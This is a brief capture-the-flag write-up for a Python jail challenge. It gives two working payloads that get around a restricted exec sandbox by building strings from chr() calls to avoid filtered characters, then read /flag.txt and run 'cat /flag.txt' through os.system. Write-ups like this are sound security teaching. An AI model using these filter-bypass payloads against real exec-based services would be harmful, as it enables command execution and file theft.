## URL
https://ctf.sigpwny.com/challenges#Meetings/Pyjail%202-633

## Concept
This chall also uses the exec funtion but with restrictions which we bypassed:  Uses __import__('os').system('cat /flag.txt')
Builds all strings using chr() to avoid quotes
Uses chr(88).lower() to get 'x' (ASCII 88 is 'X') to bypass the 'x' ban

## Method of solve
~~~
print(open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(88).lower()+chr(116)).read())
~~~
~~~
__import__(chr(111)+chr(115)).system(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(88).lower()+chr(116))
~~~
